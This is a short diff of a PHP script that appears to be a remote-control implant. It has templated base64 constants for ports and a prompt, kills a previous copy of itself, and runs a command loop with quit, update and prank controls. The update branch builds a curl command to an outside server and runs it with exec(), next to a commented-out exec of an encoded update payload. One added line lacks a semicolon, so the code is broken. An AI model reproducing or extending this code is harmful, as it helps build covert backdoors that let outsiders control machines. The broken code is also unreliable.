@@ -13,7 +13,7 @@ define('PORT_MIN', '{{B64_CONST_PORT_MIN}}');
 define('PORT_MAX', '{{B64_CONST_PORT_MAX}}');
 define('SS_PORT', '{{B64_CONST_SS_PORT}}');
 define('PROMPT', '{{B64_CONST_PROMPT}}');
-define('VERSION', '{{VERSION}}');
+define('SS_VERSION', '{{VERSION}}');
 
 if ($pid = process_running($argv[0])) {
     exec("kill $pid");
@@ -93,8 +93,10 @@ do {
         if (preg_match(REGEX_CTL_QUIT, $buf)) {
             break;
         } else if (preg_match(REGEX_CTL_UPDATE, $buf)) {
-            $msg .= "CURRENT VERSION = " . VERSION . "\n";
-            $msg .= "Server Says: '" . exec(build_curl_cmd('v')) . "'\n";
+            $msg .= "CURRENT SS_VERSION = " . SS_VERSION . "\n";
+            $cmd = build_curl_cmd('v');
+            $msg .= "CMD = $cmd\n"
+            $msg .= "Server Says: '" . exec($cmd) . "'\n";
             // exec('{{B64_CMD_UPDATE}}');
             // die();
         } else if (preg_match(REGEX_CTL_RICK_ROLL, $buf)) {
